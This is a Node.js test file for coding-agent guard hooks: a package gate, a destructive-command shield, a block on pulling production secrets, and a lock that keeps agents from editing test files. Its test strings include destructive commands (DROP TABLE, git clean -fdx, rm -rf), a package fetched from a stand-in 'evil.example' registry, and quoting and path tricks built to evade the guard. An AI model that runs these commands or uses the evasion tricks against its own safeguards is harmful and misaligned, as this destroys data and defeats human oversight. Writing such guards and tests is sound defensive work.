// Run: node --test "kit/tests/*.test.mjs"
// Package gate, destructive command shield and context percentage.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import { findPackages, check, similarPopular } from '../../.claude/hooks/package-gate.mjs';
import { evaluate, permissionEquivalent } from '../../.claude/hooks/destructive-guard.mjs';

const HOOKS = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '.claude', 'hooks');

test('package gate: extracts package names from commands', () => {
  assert.deepEqual(findPackages('npm install -D zod @types/node@20 ./yerel'), [{ eco: 'npm', name: 'zod' }, { eco: 'npm', name: '@types/node' }]);
  assert.deepEqual(findPackages('cd web && pnpm add react-dom@18.3.1'), [{ eco: 'npm', name: 'react-dom' }]);
  assert.deepEqual(findPackages('npx expo install expo-camera'), [{ eco: 'npm', name: 'expo-camera' }]);
  assert.deepEqual(findPackages('uv add "fastapi[standard]>=0.110" httpx'), [{ eco: 'pypi', name: 'fastapi' }, { eco: 'pypi', name: 'httpx' }]);
  assert.deepEqual(findPackages('pip install -r requirements.txt requests==2.32'), [{ eco: 'pypi', name: 'requests' }]);
  assert.deepEqual(findPackages('npm install'), [], 'an install without arguments (lock file) is not checked');
  assert.deepEqual(findPackages('npm run build && git status'), []);
  // 3.20.1: a redirect is not a package name (2>&1 was reported as a made-up package and the install was blocked)
  for (const c of ['npm install -D zod 2>&1 | tail -2', 'npm i zod > kurulum.log', 'npm i zod 2>/dev/null', 'npm i zod &> log.txt', 'pip install requests >> out.txt'])
    assert.deepEqual(findPackages(c).map((x) => x.name), [c.startsWith('pip') ? 'requests' : 'zod'], c);
});

test('package gate: download-and-run commands are checked; only the package, not its arguments', () => {
  const names = (c) => findPackages(c).map((x) => `${x.eco}:${x.name}`);
  assert.deepEqual(names('npx -y create-vite@latest app --template react'), ['npm:create-vite']);
  assert.deepEqual(names('npx --yes @scope/tool@1.2 build src'), ['npm:@scope/tool']);
  assert.deepEqual(names('npm exec -- cowsay hi'), ['npm:cowsay']);
  assert.deepEqual(names('npx -p typescript@5 -p ts-node tsc --init'), ['npm:typescript', 'npm:ts-node'], '-p names the packages, tsc is a command');
  assert.deepEqual(names('npx --package=lodash-cli lodash'), ['npm:lodash-cli']);
  assert.deepEqual(names('bunx prettier --write .'), ['npm:prettier']);
  assert.deepEqual(names('pnpm dlx shadcn add button'), ['npm:shadcn']);
  assert.deepEqual(names('yarn dlx degit x/y'), ['npm:degit']);
  assert.deepEqual(names('uvx ruff check .'), ['pypi:ruff']);
  assert.deepEqual(names('uvx --from "httpie==3.2" http GET x --with rich,typer'), ['pypi:httpie']);
  assert.deepEqual(names('uvx --with rich black .'), ['pypi:black', 'pypi:rich']);
  assert.deepEqual(names('uv tool run pyright'), ['pypi:pyright']);
  assert.deepEqual(names('pipx run --spec cowsay==6 cowsay moo'), ['pypi:cowsay']);
  assert.deepEqual(names('npx expo install expo-camera'), ['npm:expo-camera'], 'expo install keeps its install rule');
  assert.deepEqual(names('npx ./scripts/x.js'), [], 'a local path is not a package');
  assert.ok(findPackages('npx zod').every((x) => x.exec));
  // 3.28.0 audit: wrappers, prefixes, tool paths, manager flags and value flags must not hide the package
  for (const c of ['npx --registry https://evil.example evilpkg', 'npx --prefix . evilpkg', 'npx -w a evilpkg', 'FOO=1 npx evilpkg',
    'cmd /c npx evilpkg', 'bash -c "npx evilpkg"', 'time npx evilpkg', '(npx evilpkg)', '"npx" evilpkg', '/usr/bin/npx evilpkg',
    'npx.cmd evilpkg', 'bun x evilpkg', 'pnpm --silent dlx evilpkg', 'pnpm -C . dlx evilpkg', 'npm --silent exec evilpkg',
    'uv --quiet tool run evilpkg', 'uv run --with evilpkg x.py', 'corepack pnpm dlx evilpkg'])
    assert.deepEqual(names(c), [`${c.startsWith('uv') ? 'pypi' : 'npm'}:evilpkg`], c);
  assert.deepEqual(names('npm --prefix web install zod'), ['npm:zod']);
  assert.deepEqual(names('npm i zod@npm:evilpkg @types/x@npm:@evil/y@2'), ['npm:evilpkg', 'npm:@evil/y'], 'an npm alias installs its target');
  assert.deepEqual(names('npm i zod@github:evil/x'), [], 'a git spec is not a registry package (like a bare URL)');
  assert.deepEqual(findPackages('npx --weird evilpkg file.txt').map((x) => x.unsure), [true, true], 'after an unknown flag: asked, not denied');
  // Only npx/npm exec/bunx use a local bin first; dlx and a -p package always download
  assert.equal(findPackages('npx tsc')[0].local, true);
  for (const c of ['pnpm dlx tsc', 'yarn dlx tsc', 'pnpx tsc', 'npx -p tsc tsc']) assert.equal(findPackages(c)[0].local, undefined, c);
});

test('package gate: npx of a bin the project already has is not checked; a made-up one is denied', () => {
  const p = fs.mkdtempSync(path.join(os.tmpdir(), 'paket-'));
  fs.mkdirSync(path.join(p, 'node_modules', '.bin'), { recursive: true });
  fs.writeFileSync(path.join(p, 'node_modules', '.bin', 'yerel-bin-xq'), '');
  const run = (command) => spawnSync(process.execPath, [path.join(HOOKS, 'package-gate.mjs')], {
    input: JSON.stringify({ tool_input: { command }, cwd: p }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: p }, timeout: 20000,
  });
  const local = run('npx yerel-bin-xq --help');
  assert.equal(local.status, 0);
  assert.equal(local.stdout, '', 'local bin: no network check, no decision');
  assert.equal(run('npx -y tillerhand@3.28.0 install --type web-saas --project .').stdout, '', 'the kit\'s own package is not checked');
  // Only the plain spelling is exempt: an npm alias or a version spec downloads something else
  assert.match(run('npx -y tillerhand@npm:uydurma-paket-adi-9f3k2-yok').stdout, /"(deny|ask)"/, 'alias target is checked');
  assert.match(run('npx yerel-bin-xq@npm:uydurma-paket-adi-9f3k2-yok').stdout, /"(deny|ask)"/, 'local bin with a spec is checked');
  const made = run('npx -y uydurma-paket-adi-9f3k2-yok');
  if (!/doğrulanamadı/.test(made.stdout)) assert.match(made.stdout, /"deny"/, 'a made-up npx package is denied (offline: asked)');
  fs.rmSync(p, { recursive: true, force: true });
});

test('package gate: catches a name that looks like a popular package', () => {
  assert.equal(similarPopular('npm', 'reacts'), 'react');
  assert.equal(similarPopular('pypi', 'reqeusts'), null, 'a two-letter swap is distance 2');
  assert.equal(similarPopular('pypi', 'request'), 'requests');
  assert.equal(similarPopular('npm', 'react'), null, 'popular itself');
});

const response = (status, body) => ({ status, ok: status >= 200 && status < 300, json: async () => body });
const now = Date.parse('2026-10-11T00:00:00Z');

test('package gate: registry decisions', async () => {
  const get = (data) => async (url) => data[url.includes('downloads') ? 'downloads' : 'pkg'];
  assert.equal((await check({ eco: 'npm', name: 'olmayan-paket' }, get({ pkg: response(404) }), now)).status, 'missing');
  assert.equal((await check({ eco: 'npm', name: 'taze' }, get({ pkg: response(200, { time: { created: '2026-10-01' } }), downloads: response(200, { downloads: 99999 }) }), now)).status, 'new');
  assert.equal((await check({ eco: 'npm', name: 'sessiz' }, get({ pkg: response(200, { time: { created: '2020-01-01' } }), downloads: response(200, { downloads: 12 }) }), now)).status, 'low');
  assert.equal((await check({ eco: 'npm', name: 'saglam' }, get({ pkg: response(200, { time: { created: '2020-01-01' } }), downloads: response(200, { downloads: 50000 }) }), now)).status, 'ok');
  assert.equal((await check({ eco: 'pypi', name: 'yeni-py' }, get({ pkg: response(200, { releases: { '0.1': [{ upload_time_iso_8601: '2026-10-05T00:00:00Z' }] } }) }), now)).status, 'new');
  assert.equal((await check({ eco: 'pypi', name: 'x' }, async () => { throw new Error('ağ'); }, now)).status, 'unknown');
});

test('shield: destructive commands are denied, normal commands pass', () => {
  const k = (s) => evaluate(s)?.decision ?? 'free';
  const table = 'users';
  assert.equal(k(`psql -c "DROP TABLE ${table}"`), 'deny');
  assert.equal(k(`psql -c 'TRUNCATE ${table}'`), 'deny');
  assert.equal(k(`psql -c 'DELETE FROM ${table}'`), 'deny', 'no WHERE');
  assert.equal(k(`psql -c "DELETE FROM ${table} WHERE id=1"`), 'free');
  assert.equal(k('npx supabase db reset'), 'deny');
  assert.equal(k('npx prisma migrate reset --force'), 'deny');
  assert.equal(k('docker compose down -v'), 'deny');
  assert.equal(k('git clean -fdx'), 'deny');
  assert.equal(k('vercel --prod'), 'ask');
  assert.equal(k('npx -y vercel@63.1.1 deploy --prod'), 'ask', 'prod deploy via pinned npx');
  assert.equal(k('npx vercel@63.1.1 promote https://app-abc.vercel.app'), 'ask', 'promoting a preview to prod');
  assert.equal(k('vercel rollback'), 'ask', 'prod rollback');
  assert.equal(k('eas update --branch production --message x'), 'ask');
  assert.equal(k('eas update --environment production --channel production --message x'), 'ask', 'prod OTA by environment or channel');
  assert.equal(k('npx eas-cli update --channel=production'), 'ask');
  assert.equal(k('eas update:rollback'), 'ask', 'OTA rollback');
  assert.equal(k('eas deploy --prod'), 'ask', 'EAS Hosting prod');
  assert.equal(k('eas update --message "a & b | c" --channel production'), 'ask', '& or | inside a quoted message');
  // A quoted & or | does not end the command for any rule
  assert.equal(k('vercel deploy --meta "a&b" --prod'), 'ask');
  assert.equal(k("vercel --scope 'x|y' rollback"), 'ask');
  assert.equal(permissionEquivalent('rm "a&b" -rf build')?.decision, 'deny', 'Codex/Antigravity list too');
  assert.equal(permissionEquivalent('git push origin "a|b" --force')?.decision, 'deny');
  assert.equal(k('git commit -m "a & b" && npm test'), 'free', 'an ordinary chain stays free');
  assert.equal(k('eas deploy --message "x & y" --prod'), 'ask');
  assert.equal(k('eas update --branch preview --message x'), 'free');
  assert.equal(k('npx -y vercel@63.1.1 deploy'), 'free', 'preview deploy');
  assert.equal(k('vercel --scope ekip promote https://app-abc.vercel.app'), 'ask', 'promote even with a flag in between');
  assert.equal(k('npx vercel@63.1.1 -t $TOKEN rollback'), 'ask', 'rollback even with a flag in between');
  assert.equal(k('vercel deploy --target=production'), 'ask', '--target=production');
  assert.equal(k('vercel deploy --target production'), 'ask', '--target production');
  assert.equal(k('vercel deploy --target preview'), 'free');
  assert.equal(k('vercel deploy --target "production"'), 'ask', 'quoted target');
  assert.equal(k("vercel deploy --target='prod'"), 'ask', 'quoted = target');
  assert.equal(k('vercel deploy --target    production'), 'ask', 'many spaces');
  assert.equal(k('vercel --scope ekip "promote" https://a.vercel.app'), 'ask', 'quoted subcommand');
  // The same command once the shell removes quotes and escapes: the rules also apply to the unquoted text
  assert.equal(k('vercel deploy --pro""d'), 'ask', 'quote inside a word');
  assert.equal(k("vercel deploy --'prod'"), 'ask');
  assert.equal(k('vercel pro\\mote https://a.vercel.app'), 'ask', 'backslash escape');
  assert.equal(k("vercel deploy $'--prod'"), 'ask', "$'..' string");
  assert.equal(k('psql -c "DR""OP TABLE users"'), 'deny', 'quote inside SQL');
  assert.equal(k('git commit -m "it\'s fine"'), 'free', 'an ordinary quoted command is free');
  assert.equal(permissionEquivalent('git reset --ha"rd" HEAD~1')?.decision, 'deny', 'the permission equivalent also unquotes');
  // When in doubt, ask: obfuscation mark + guarded keyword (no attempt to emulate the shell)
  assert.equal(k('vercel deploy --pr\\\nod'), 'ask', 'trailing \\');
  assert.equal(k("vercel deploy $'\\x2d\\x2dprod'"), 'ask', 'ANSI-C escape');
  assert.equal(k('vercel pro$()mote https://a.vercel.app'), 'ask', 'empty substitution');
  assert.equal(k('git reset --ha${X}rd HEAD~1'), 'ask', 'variable fragment');
  assert.equal(k('psql -c "DR`true`OP TABLE users"'), 'ask', 'backtick substitution');
  assert.equal(k('rm -r$@f build'), 'ask', '$@ fragment');
  assert.equal(k('echo $(date) && npm run build'), 'free', 'obfuscation but no guarded word');
  assert.equal(k("vercel deploy $'--target=preview'"), 'free', 'preview');
  assert.equal(k('git push origin main'), 'ask');
  assert.equal(k('psql postgres://u:p@db.ornek-prod.com:5432/app -c "select 1"'), 'ask', 'remote database');
  assert.equal(k('psql postgres://u:p@localhost:5432/app -c "select 1"'), 'free');
  assert.equal(k('npm run test && git status'), 'free');
  assert.equal(k('git push origin ozellik/fatura'), 'free');
});

test('F-04 shield: prod environment variables cannot be pulled onto the agent\'s machine', () => {
  const k = (s) => evaluate(s)?.decision ?? 'free';
  assert.equal(k('vercel env pull .env.local --environment=production'), 'deny');
  assert.equal(k('npx -y vercel@63.1.1 env pull --environment production'), 'deny');
  assert.equal(k('vercel pull --yes --environment=prod'), 'deny');
  assert.equal(k('vercel --environment production env pull'), 'deny', 'flag before the subcommand');
  assert.equal(k('vercel env pull --environment "production"'), 'deny', 'quoted');
  assert.equal(k('vercel env pull .env.local'), 'free', 'default: development');
  assert.equal(k('vercel env pull --environment=preview'), 'free');
  assert.equal(k('vercel env pull --environment "development"'), 'free', 'quoted development');
  assert.equal(k('vc env pull --environment=production'), 'deny', 'vc short name');
  assert.equal(k('vc deploy --prod'), 'ask', 'prod deploy with vc');
  assert.equal(k('vc promote https://a.vercel.app'), 'ask');
  assert.equal(k('vercel env pull --environment=$ORTAM'), 'ask', 'environment from a variable');
  assert.equal(k('vercel pull --environment $(cat ortam)'), 'ask', 'environment from command substitution');
  assert.equal(k('vercel env pull --environment=staging'), 'ask', 'unknown environment');
  assert.equal(k('vercel env pull --environment=pro$()duction'), 'ask', 'obfuscated pull');
});

test('F-02 shield: a command that changes or deletes a test file from the shell is asked, running tests is free', () => {
  const k = (s) => evaluate(s)?.decision ?? 'free';
  for (const s of [
    "sed -i 's/expect/x/' src/a.test.ts", 'rm src/a.test.ts', 'rm -r tests/', 'echo x > src/a.test.ts',
    "cat >> kit/tests/x.test.mjs <<'EOF'", 'mv tests/a.test.ts src/a.ts', 'git checkout -- tests/a.test.ts',
    'Set-Content tests\\a.test.ts x', 'npm run lint && rm "src/a.test.ts"', 'perl -pi -e s/a/b/ odeme_test.py',
    "sed -e 's/a/b/' -i tests/a.test.ts", "sed --in-place 's/a/b/' a.test.ts", "sed -i 's/x/y/' package.json",
    'rm vitest.config.ts', 'echo {} > conftest.py',
  ]) assert.equal(k(s), 'ask', s);
  for (const s of [
    'npx vitest run src/a.test.ts', 'node --test "kit/tests/*.test.mjs" 2>&1 | grep fail', 'cat tests/a.test.ts',
    'rm -r node_modules && npx vitest run src/a.test.ts', 'node --test kit/tests/a.test.mjs > sonuc.txt',
  ]) assert.equal(k(s), 'free', s);
});

test('context percentage: the status line shows the ready field or the token count', () => {
  const bar = (cw) => spawnSync(process.execPath, [path.join(HOOKS, 'statusline.mjs')], {
    input: JSON.stringify({ workspace: { project_dir: os.tmpdir() }, context_window: cw }), encoding: 'utf8',
  }).stdout;
  assert.match(bar({ used_percentage: 41.6 }), /bağlam %42/);
  assert.match(bar({ context_window_size: 200000, current_usage: { input_tokens: 1000, cache_read_input_tokens: 99000, output_tokens: 5000 } }), /bağlam %50 ⚠/);
  assert.doesNotMatch(bar(null), /bağlam/);
});

test('structure guard: map, sandbox, clutter patterns', async () => {
  const { globRegex, check: checkPath } = await import('../../.claude/hooks/structure-guard.mjs');
  assert.ok(globRegex('src/features/*/components/**').test('src/features/invoice/components/List.tsx'));
  assert.ok(!globRegex('src/features/*/components/**').test('src/features/invoice/random/List.tsx'));
  assert.ok(globRegex('docs/**').test('docs/a/b/c.md'));
  assert.ok(globRegex('next.config.*').test('next.config.mjs'));
  const map = {
    allow: ['README.md', 'docs/**', 'src/features/*/components/**', 'src/lib/**'].map(globRegex),
    deny: ['**/*.bak', '**/*-old.*', '**/* copy*'].map(globRegex),
    raw: { allow: ['README.md', 'docs/**', 'src/features/*/components/**', 'src/lib/**'] },
  };
  assert.equal(checkPath('src/features/invoice/components/List.tsx', map), null);
  assert.equal(checkPath('sandbox/deneme.ts', map), null, 'sandbox is free');
  assert.equal(checkPath('src/utils/x.ts', map)?.decision, 'ask', 'off the map is asked');
  assert.equal(checkPath('src/lib/db-old.ts', map)?.decision, 'deny', 'an old-version file is denied');
  assert.equal(checkPath('docs/plan copy.md', map)?.decision, 'deny');
  assert.equal(checkPath(['src', 'lib', 'db.ts'].join(String.fromCharCode(92)), map), null, 'Windows separator');
  assert.equal(checkPath('herhangi.txt', null), null, 'no map: free');
});

test('edit lock: inside the folder is free, outside and a similarly named folder are denied', async () => {
  const { allowedInLock } = await import('../../.claude/hooks/freeze-guard.mjs');
  const root = path.resolve(os.tmpdir(), 'kilit-kok');
  assert.equal(allowedInLock('src/features/auth/login.ts', 'src/features/auth', root), true);
  assert.equal(allowedInLock(path.join(root, 'src/features/auth/x.ts'), 'src/features/auth/', root), true, 'absolute path and trailing /');
  assert.equal(allowedInLock('src/features/authz/x.ts', 'src/features/auth', root), false, 'a prefix match is not enough');
  assert.equal(allowedInLock('src/lib/db.ts', 'src/features/auth', root), false);
  assert.equal(allowedInLock('docs/workflow/progress.md', 'src/features/auth', root), true, 'the progress note is free');
});

test('edit lock: the hook rejects outside writes while locked, free once unlocked', async () => {
  const fs = await import('node:fs');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'kilit-'));
  const run = (args, input) => spawnSync('node', [path.join(HOOKS, 'freeze-guard.mjs'), ...args], { input, encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: root } });
  const write = (f) => JSON.stringify({ tool_input: { file_path: path.join(root, f) } });
  assert.equal(run([], write('src/lib/x.ts')).stdout, '', 'silent without a lock');
  assert.match(run(['--set', 'src/features/auth'], '').stdout, /src\/features\/auth/);
  assert.match(run([], write('src/lib/x.ts')).stdout, /"permissionDecision":"deny"/);
  assert.equal(run([], write('src/features/auth/a.ts')).stdout, '');
  run(['--off'], '');
  assert.equal(run([], write('src/lib/x.ts')).stdout, '');
});

test('edit lock: the allowed --set prefix cannot remove or widen the lock, only narrow it', async () => {
  const fs = await import('node:fs');
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'kilit2-'));
  const run = (...args) => spawnSync('node', [path.join(HOOKS, 'freeze-guard.mjs'), ...args], { encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: root } });
  const lock = () => JSON.parse(fs.readFileSync(path.join(root, '.claude/state/freeze.json'), 'utf8')).dir;
  run('--set', 'src/features/auth');
  run('--set', 'x', '--off');
  assert.equal(lock(), 'src/features/auth', 'a trailing --off does not remove the lock');
  assert.equal(run('--set', '.').status, 1, 'the lock cannot widen to the whole project');
  assert.equal(run('--set', 'src').status, 1, 'cannot widen to a parent folder');
  assert.equal(run('--set', 'src/features/auth/login').status, 0, 'narrowing is free');
  assert.equal(lock(), 'src/features/auth/login');
  run('--off');
  assert.equal(fs.existsSync(path.join(root, '.claude/state/freeze.json')), false);
});

test('test-writer K3 shield: in Claude only the test-writer agent may touch a test file from the shell', () => {
  const touch = [
    "sed -i 's/expect/x/' src/a.test.ts", 'rm src/a.test.ts', 'rm -r tests/', 'echo x > src/a.test.ts',
    "cat >> kit/tests/x.test.mjs <<'EOF'", 'mv tests/a.test.ts src/a.ts', 'git checkout -- tests/a.test.ts',
    'Set-Content tests\a.test.ts x', 'npm run lint && rm "src/a.test.ts"', 'perl -pi -e s/a/b/ odeme_test.py',
    "sed -e 's/a/b/' -i tests/a.test.ts", "sed --in-place 's/a/b/' a.test.ts",
  ];
  const run = ['npx vitest run src/a.test.ts', 'node --test "kit/tests/*.test.mjs" 2>&1 | grep fail', 'cat tests/a.test.ts',
    'rm -r node_modules && npx vitest run src/a.test.ts', 'node --test kit/tests/a.test.mjs > sonuc.txt'];
  const ctxs = [undefined, { tool: 'claude', agent: '' }, { tool: 'claude', agent: 'test-writer' }, { tool: 'claude', agent: 'general-purpose' }, { tool: 'codex', agent: '' }, { tool: 'antigravity', agent: '' }];
  for (const s of touch) {
    assert.equal(evaluate(s)?.decision, 'ask', `no ctx (old callers): ${s}`);
    for (const agent of ['', 'general-purpose']) {
      const r = evaluate(s, { tool: 'claude', agent });
      assert.equal(r?.decision, 'deny', `claude, agent "${agent}": ${s}`);
      assert.match(r.reason, /test-writer/, s);
    }
    assert.equal(evaluate(s, { tool: 'claude', agent: 'test-writer' })?.decision, 'ask', `test-writer: ${s}`);
    assert.equal(evaluate(s, { tool: 'codex', agent: '' })?.decision, 'ask', `codex: ${s}`);
    assert.equal(evaluate(s, { tool: 'antigravity', agent: '' })?.decision, 'ask', `antigravity: ${s}`);
  }
  for (const s of run) for (const ctx of ctxs) assert.equal(evaluate(s, ctx), null, `${s} ${JSON.stringify(ctx)}`);
});

test('test-writer K3 shield hook: a Claude shell command on a test file is denied outside test-writer', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'shield-tw-'));
  const hook = (extra) => {
    const r = spawnSync(process.execPath, [path.join(HOOKS, 'destructive-guard.mjs')], {
      input: JSON.stringify({ tool_name: 'Bash', cwd: root, ...extra, tool_input: { command: 'rm src/a.test.ts' } }),
      encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: root },
    });
    return JSON.parse(r.stdout).hookSpecificOutput;
  };
  const main = hook({});
  assert.equal(main.permissionDecision, 'deny');
  assert.match(main.permissionDecisionReason, /test-writer/);
  assert.equal(hook({ agent_type: 'test-writer' }).permissionDecision, 'ask');
});

test('test-writer K6 shield: quoted text with spaces is an argument, a quoted single-word path is still a test write', () => {
  const ctx = { tool: 'claude', agent: '' };
  for (const s of ['grep -n "<tr><td>Test koruması</td>" kit/guide.html', `node -e "const s='rm tests/a.test.ts'"`]) {
    assert.notEqual(evaluate(s, ctx)?.decision, 'deny', s);
  }
  for (const s of ['echo x > "src/a.test.ts"', 'rm "tests/a.test.ts"', "rm 'kit/tests/x.test.mjs'"]) {
    assert.equal(evaluate(s, ctx)?.decision, 'deny', s);
  }
  assert.equal(evaluate('cat tests/a.test.ts', ctx), null);
});

test('test-writer K7b shield: other shell ways to write a test file are caught; dependency and git folders are not test folders', () => {
  const main = { tool: 'claude', agent: '' };
  const tw = { tool: 'claude', agent: 'test-writer' };
  const deny = ['touch src/a.test.ts', 'ln -s a.ts src/b.test.ts', 'dd if=a.ts of=src/a.test.ts',
    'curl -o tests/x.ts https://example.com/x', 'wget -O tests/x.ts https://example.com/x'];
  const atLeastAsk = [`node -e "require('fs').writeFileSync('src/a.test.ts','x')"`, `python -c "open('tests/a.py','w').write('x')"`,
    'bash -c "echo x > tests/a.test.ts"'];
  const notTests = ['rm -rf node_modules/pkg/test/x', 'rm -rf .git/x/tests/y'];
  for (const s of deny) {
    const r = evaluate(s, main);
    assert.equal(r?.decision, 'deny', s);
    assert.match(r.reason, /test-writer/, s);
  }
  for (const s of atLeastAsk) assert.ok(['ask', 'deny'].includes(evaluate(s, main)?.decision), `at least ask: ${s}`);
  for (const s of notTests) assert.notEqual(evaluate(s, main)?.decision, 'deny', s);
  for (const s of [...deny, ...atLeastAsk, ...notTests]) assert.notEqual(evaluate(s, tw)?.decision, 'deny', `test-writer: ${s}`);
});

// K8: path tricks cannot slip past the test split.
test('test-writer K8a shield: a path that goes through a dependency or git folder with .. is normalized and still counts as a test path', () => {
  const main = { tool: 'claude', agent: '' };
  for (const s of ['rm tests/../node_modules/../tests/a.test.ts', 'rm node_modules/../src/a.test.ts', 'touch .git/../tests/x.ts']) {
    const r = evaluate(s, main);
    assert.equal(r?.decision, 'deny', s);
    assert.match(r.reason, /test-writer/, s);
  }
  for (const s of ['rm -rf node_modules/pkg/test/x', 'rm -rf ./node_modules/pkg/tests']) assert.notEqual(evaluate(s, main)?.decision, 'deny', s);
});

test('test-writer K8c shield: a path that stays inside a dependency or git folder anywhere in the path is not a project test path', () => {
  const main = { tool: 'claude', agent: '' };
  for (const s of ['rm -rf C:\\proj\\node_modules\\x\\tests', 'rm -rf /home/u/p/node_modules/x/tests', // kit:yol-izinli
    'rm -rf src/node_modules/pkg/tests', 'rm -rf packages/a/.git/x/tests']) {
    assert.notEqual(evaluate(s, main)?.decision, 'deny', s);
  }
  const r = evaluate('rm node_modules/../src/a.test.ts', main);
  assert.equal(r?.decision, 'deny');
  assert.match(r.reason, /test-writer/);
});
